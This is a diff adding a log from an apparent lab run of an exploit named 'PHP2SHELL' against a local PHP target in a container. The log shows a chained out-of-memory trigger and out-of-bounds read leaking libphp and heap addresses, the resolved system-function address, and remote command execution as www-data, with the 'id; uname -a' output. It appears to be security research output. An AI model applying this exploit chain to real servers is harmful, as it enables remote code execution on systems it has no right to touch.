@@ -1,0 +1,17 @@
+
+=== 2026-10-23T03:55:18.708469+00:00 ===
+=== PHP2SHELL official target — HTTP/TLS ===
+target: http://127.0.0.1:18110/index.php
+outdir: /home/ravhi/randoman/deepjb/php2shell-lab/official-lab/out
+mode: single-worker chain
+[*] exec: id; uname -a
+[*] restarting container bcbcbe31657c for fresh ASLR
+[try 1/3] A1: END-cleanup send_cookie OOM
+      A1 body generated; sending chunked END-cleanup OOM
+      B1 body generated; sending chunked stale-id OOB read
+      decoded=819208 zval_ptr_dtor=0x7f900d6e3b60 -> libphp=0x7f900d085000
+      chunk buckets: [('0x7f900ac00000', 7495), ('0x7f900d600000', 1095), ('0x7f900b400000', 87), ('0x7f900aa00000', 79)]
+[try 1] A2 + B2 (1/2): main=0x7f900b400000 S=0x7f900b4f8398 zif_system=0x7f900d4ea370
+[+] output (/out/o2e7b4073):
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux bcbcbe31657c 5.15.153.1-microsoft-standard-WSL2 #1 SMP Fri Mar 29 23:14:13 UTC 2024 x86_64 GNU/Linux
